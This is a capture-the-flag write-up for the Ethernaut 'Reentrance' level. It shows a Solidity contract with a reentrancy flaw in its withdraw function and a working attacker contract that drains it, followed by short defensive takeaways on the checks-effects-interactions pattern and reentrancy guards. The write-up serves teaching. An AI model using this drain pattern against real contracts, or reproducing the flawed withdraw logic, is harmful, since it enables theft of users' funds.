## Challenge
~~~
The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```
`

## Solution

```
contract Attack {
    IReentrancy private immutable target;

    constructor(address _target) public {
        target = IReentrancy(_target);
    }

    // NOTE: attack cannot be called inside constructor
    function attack() external payable {
        target.donate{value: 0.01 ether}(address(this));
        target.withdraw(0.01 ether);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 amount = min(0.01 ether, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}
```

## Key takeaways and useful resources

Again the CEI pattern is not implemented correctly. Other options to be safe against those kind of attacks is the OpenZeppelin ReentrancyGuard or implementing a manual check if we have

[OZ Reentrancy guard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)
[Medium article about reentrancy](https://medium.com/immunefi/the-ultimate-guide-to-reentrancy-19526f105ac)

